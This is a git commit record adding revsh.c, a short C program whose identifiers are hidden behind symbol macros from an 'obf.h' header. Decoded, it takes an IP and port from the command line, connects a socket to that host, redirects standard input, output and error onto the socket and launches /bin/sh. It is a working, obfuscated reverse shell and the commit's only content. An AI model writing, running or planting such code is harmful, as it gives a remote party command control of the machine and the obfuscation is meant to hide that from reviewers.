1c36256959a6c0d5d5fe07576c7d025ba11a18fe
1v4n <42386354+gaidardzhiev@users.noreply.github.com>
2024-09-13 11:26:42 +0300

    Add files via upload

---
+++ revsh.c
@@ -0,0 +1,8 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+#include "obf.h"
+#define HEX "\x75\x73\x61\x67\x65\x3A\x20\x25\x73\x20\x3C\x69\x70\x3E\x20\x3C\x70\x6F\x72\x74\x3E"
+π w(π c,÷*v[]){¶(c!=3){p(¢,HEX"\n",v[0]);∆ 1;}π s;√ x £;÷*o=v[1];π q=m(v[2]);s=a(g,j,0);£.•=g;£.r=¥(q);°(g,o,&£.y);¶(k(s,(√ b*)&£,×(£))<0){f("failed");∆ 1;}d(s,0);d(s,1);d(s,2);e("/bin/sh",NULL,NULL);∆ 0;}
